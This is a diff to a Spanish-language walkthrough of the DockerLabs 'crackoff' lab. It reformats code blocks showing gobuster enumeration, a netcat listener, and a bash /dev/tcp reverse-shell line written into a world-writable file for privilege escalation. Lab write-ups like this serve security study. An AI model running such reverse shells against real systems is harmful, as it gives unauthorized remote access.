@@ -135,7 +135,7 @@ Durante el reconocimiento, se identificó la posibilidad de acceso anónimo en s
 
 ### Gobuster
 Se enumero subdirectorios con la herramienta  **gobuster**
-```json
+```bash
 ┌──(kali㉿kali)-[~/Estudios/DockerLabs/crackoff/nmap]
 └─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
 ===============================================================
@@ -643,15 +643,15 @@ Aprovechando que el archivo es editable por cualquier usuario, se procedió a in
 
 **Pasos realizados:**
 1. **Escucha local:** Se habilitó un listener en la máquina atacante. 
-    ```Bash
+    ```bash
     nc -lvnp 4444
     ```
     
 2. **Inyección del código:** Se sobrescribió el contenido de `/opt/alice/boss` con la instrucción de conexión.
 
-    ```Bash
-    echo "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" > /opt/alice/boss
-    ```
+```bash
+echo "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" > /opt/alice/boss
+```
     
 
 ### Ejecución y Shell Obtenida
